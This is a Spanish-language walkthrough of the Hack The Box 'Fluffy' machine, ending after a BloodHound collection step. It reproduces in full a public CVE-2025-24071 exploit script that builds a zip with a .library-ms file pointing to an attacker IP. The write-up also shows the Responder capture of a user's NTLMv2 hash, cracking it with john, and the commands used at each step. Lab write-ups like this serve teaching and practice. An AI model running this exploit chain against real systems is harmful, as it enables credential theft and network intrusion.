---
layout: post
title: Fluffy HTB
comments: true
categories: [HTB, Writeups]
---

En este post estaremos resolviendo la máquina Fluffy de [Hack The Box](https://app.hackthebox.com/machines/Fluffy).

<br>
![Image]({{ site.baseurl }}/images/posts/HTB/fluffy-HTB.webp){:width="200px"}
<br>

# Reconocimiento

Obtenemos los siguientes resultados de nmap:

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-10 05:13:20Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-06-10T05:14:50+00:00; +7h00m02s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-06-10T05:14:50+00:00; +7h00m02s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-10T05:14:50+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-10T05:14:50+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
49750/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-10T05:14:12
|_  start_date: N/A
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

Además, en la descripción de la máquina nos dan credenciales:

    As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account:
    j.fleischman / J0elTHEM4n1990!

## SMB

Dado que es una máquina windows y tenemos SMB abierto, podemos lanzar **smbmap**:

```bash
smbmap -H 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!'

[...]

[+] IP: 10.10.11.69:445	Name: 10.10.11.69         	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ, WRITE	
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
```

Vemos que tenemos privilegios en el recurso IT. Vamos a ver que esconde con **smbclient**:

```bash
smbclient  //10.10.11.69/IT -U j.fleischman

Password for [WORKGROUP\j.fleischman]:

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jun 10 07:32:44 2025
  ..                                  D        0  Tue Jun 10 07:32:44 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 17:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 17:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 17:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025
```

Veamos que contiene el pdf:

<br>
![Image]({{ site.baseurl }}/images/posts/HTB/fluffy-1.png)
<br>

Parece que contiene un reporte de vulnerabilidades de la máquina, concretamente hay dos vulnerabilidades críticas. Nos centraremos en la **CVE-2025-24071**.

# Explotación

Con un poco de búsqueda en internet encontramos el siguiente [script](https://github.com/ThemeHackers/CVE-2025-24071/blob/main/exploit.py). La vulnerabilidad nos permite crear archivos comprimidos maliciosos con los que potencialmente exponer el hash NTLM del usuario a través de una vulnerabilidad del Explorador de Archivos.

```python
import os
import zipfile
import argparse
import time
import sys
import itertools
from colorama import init, Fore, Style

init()

def loading_animation(duration):
    """Display a simple loading animation for specified duration"""
    spinner = itertools.cycle(['-', '/', '|', '\\'])
    end_time = time.time() + duration
    while time.time() < end_time:
        sys.stdout.write(f'\r{Fore.YELLOW}Processing {next(spinner)}{Style.RESET_ALL}')
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r')

def print_ascii_art():
    """Print ASCII art banner"""
    art = r"""
          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __  
         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ | 
        |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | | 
        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | | 
        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | | 
         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_| 
                                                
                                                
                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)
                    by ThemeHackers                                                                                                                                                           
    """
    print(f"{Fore.CYAN}{art}{Style.RESET_ALL}")

def show_affected_versions():
    """Display list of affected versions"""
    affected_versions = [
        "Windows 10 Version 1809 for x64-based Systems",
        "Windows 10 Version 1809 for 32-bit Systems",
        "Windows Server 2025 (Server Core installation)",
        "Windows Server 2025",
        "Windows Server 2012 R2 (Server Core installation)",
        "Windows Server 2012 R2",
        "Windows Server 2016 (Server Core installation)",
        "Windows Server 2016",
        "Windows 10 Version 1607 for x64-based Systems",
        "Windows 10 Version 1607 for 32-bit Systems",
        "Windows 10 for x64-based Systems",
        "Windows 10 for 32-bit Systems",
        "Windows 11 Version 24H2 for x64-based Systems",
        "Windows 11 Version 24H2 for ARM64-based Systems",
        "Windows Server 2022, 23H2 Edition (Server Core installation)",
        "Windows 11 Version 23H2 for x64-based Systems",
        "Windows 11 Version 23H2 for ARM64-based Systems",
        "Windows 10 Version 22H2 for 32-bit Systems",
        "Windows 10 Version 22H2 for ARM64-based Systems",
        "Windows 10 Version 22H2 for x64-based Systems",
        "Windows 11 Version 22H2 for x64-based Systems",
        "Windows 11 Version 22H2 for ARM64-based Systems",
        "Windows 10 Version 21H2 for x64-based Systems",
        "Windows 10 Version 21H2 for ARM64-based Systems",
        "Windows 10 Version 21H2 for 32-bit Systems",
        "Windows Server 2022 (Server Core installation)",
        "Windows Server 2022",
        "Windows Server 2019 (Server Core installation)",
        "Windows Server 2019"
    ]
    print(f"{Fore.GREEN}Affected versions:{Style.RESET_ALL}")
    for version in affected_versions:
        print(f"- {version}")

def create_exploit(file_name, ip_address):
    print_ascii_art()
    print(f"{Fore.GREEN}Creating exploit with filename: {file_name}.library-ms{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Target IP: {ip_address}{Style.RESET_ALL}\n")

    library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip_address}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>"""

    library_filename = f"{file_name}.library-ms"

    print(f"{Fore.BLUE}Generating library file...{Style.RESET_ALL}")
    loading_animation(1.5)
    try:
        with open(library_filename, 'w', encoding='utf-8') as f:
            f.write(library_content)
        print(f"{Fore.GREEN}✓ Library file created successfully{Style.RESET_ALL}")
    except IOError as e:
        print(f"{Fore.RED}✗ Error writing file: {e}{Style.RESET_ALL}")
        return

    print(f"\n{Fore.BLUE}Creating ZIP archive...{Style.RESET_ALL}")
    loading_animation(1.5)
    try:
        with zipfile.ZipFile('exploit.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(library_filename)
        print(f"{Fore.GREEN}✓ ZIP file created successfully{Style.RESET_ALL}")
    except IOError as e:
        print(f"{Fore.RED}✗ Error creating ZIP file: {e}{Style.RESET_ALL}")
        return

    print(f"\n{Fore.BLUE}Cleaning up temporary files...{Style.RESET_ALL}")
    loading_animation(1.0)
    try:
        if os.path.exists(library_filename):
            os.remove(library_filename)
        print(f"{Fore.GREEN}✓ Cleanup completed{Style.RESET_ALL}")
    except OSError:
        print(f"{Fore.RED}✗ Warning: Could not delete {library_filename}{Style.RESET_ALL}")

    print(f"\n{Fore.GREEN}Process completed successfully!{Style.RESET_ALL}")
    print(f"Output file: {Fore.YELLOW}exploit.zip{Style.RESET_ALL}")
    print(f"Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.")
if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='Create an exploit ZIP file or show affected versions')
    parser.add_argument('-f', '--file-name', 
                        help='Name of the library file (without extension)')
    parser.add_argument('-i', '--ip-address', 
                        help='IP address (e.g., 192.168.1.111)')
    parser.add_argument('-afv', '--affected-versions', action='store_true', 
                        help='Display affected versions')

    args = parser.parse_args()


    if not (args.file_name or args.ip_address or args.affected_versions):
        print(f"{Fore.RED}✗ Error: No arguments provided{Style.RESET_ALL}")
        parser.print_help()
    
    elif args.affected_versions:
        show_affected_versions()
      
        if args.file_name and args.ip_address:
            print(f"\n{Fore.YELLOW}Proceeding with exploit creation...{Style.RESET_ALL}")
            create_exploit(args.file_name, args.ip_address)
       
        elif args.file_name or args.ip_address:
            print(f"\n{Fore.RED}✗ Error: Both --file-name and --ip-address are required for exploit creation{Style.RESET_ALL}")
    
   
    else:
        if args.file_name and args.ip_address:
            create_exploit(args.file_name, args.ip_address)
        else:
            print(f"{Fore.RED}✗ Error: Both --file-name and --ip-address are required{Style.RESET_ALL}")
            parser.print_help()
```

```bash
python3 ./exploit.py -i <tu-ip> -f documents

          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __  
         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ | 
        |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | | 
        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | | 
        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | | 
         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_| 
                                                
                                                
                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)
                    by ThemeHackers                                                                                                                                                           
    
Creating exploit with filename: documents.library-ms
Target IP: 10.10.11.69

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.
```

Lo subimos mediante smbclient:

```bash
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (2.5 kb/s) (average 2.5 kb/s)
```

Para capturar el hash nos ponemos en escucha con **responder**:

```bash
sudo responder -I tun0 -wvF
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [ON]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.229]
    Responder IPv6             [dead:beef:2::10e3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-9DSUZFHZKTM]
    Responder Domain Name      [JIJI.LOCAL]
    Responder DCE-RPC Port     [48359]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:2f1221cf15a35fc6:16A4355D6E6CC82AE0D71F0C407C9C86:010100000000000000E67DC0A1D9DB01E20924EC731E714700000000020008004A0049004A00490001001E00570049004E002D0039004400530055005A00460048005A004B0054004D0004003400570049004E002D0039004400530055005A00460048005A004B0054004D002E004A0049004A0049002E004C004F00430041004C00030014004A0049004A0049002E004C004F00430041004C00050014004A0049004A0049002E004C004F00430041004C000700080000E67DC0A1D9DB0106000400020000000800300030000000000000000100000000200000EEDA4B5B96E2D2927031C6DF4B09E8CB8D5B75C075EE90C73DA30198ED8B8B520A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200320039000000000000000000
```

## Romper el hash

Ahora podemos tratar de romper el hash con **john**:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)     
1g 0:00:00:01 DONE (2025-06-10 00:59) 0.5813g/s 2626Kp/s 2626Kc/s 2626KC/s proquis..programmercomputer
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

## Bloodhound

```bash
bloodhound-python -u 'p.agila' -p 'prometheusx-303'  -d fluffy.htb -ns 10.10.11.69 -c All --zip
```



<br>
